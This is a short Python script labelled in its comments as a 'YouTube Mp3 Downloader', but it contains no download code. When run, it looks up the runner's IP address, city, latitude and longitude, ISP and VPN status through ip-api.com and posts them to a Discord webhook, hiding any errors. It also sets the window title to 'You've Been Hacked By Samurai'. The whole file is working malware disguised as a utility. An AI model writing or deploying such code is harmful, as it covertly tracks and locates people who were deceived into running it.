# Copyright (c) 2022 All Rights Reserved / Null
# YouTube Mp3 Downloader Developed & Programmed By Null
# Gain our Friendsip - @entrysquad (IG) @overexcited (T)

# Libraries
import requests
import colorama
import os
from colorama import Fore
from os import system
colorama.init(autoreset=True)
system("title " + "You've Been Hacked By Samurai")

webhook = "Webhook"

# Null
logo = f"""
⠀⠀⠀
 █▀ ▄▀█ █▀▄▀█ █ █ █▀█ ▄▀█ █
 ▄█ █▀█ █ ▀ █ █▄█ █▀▄ █▀█ █ {Fore.WHITE}(v1.0){Fore.RESET}
                ▬▬ι═══════ﺤ
"""
print(Fore.RED+logo)


def Samurai():
  try:
    # Request Api
    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
    data = requests.get(api).json()
    content = f"**Samurai Successfully Found**: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']}**"
    requests.post(webhook, json={"avatar_url":"https://media.discordapp.net/attachments/966994493515640845/967498601959936172/IMG_0675.jpg",'username': 'Samurai v1.0 - By Null', 'content': content})
  except:
    pass

Samurai()
# End /
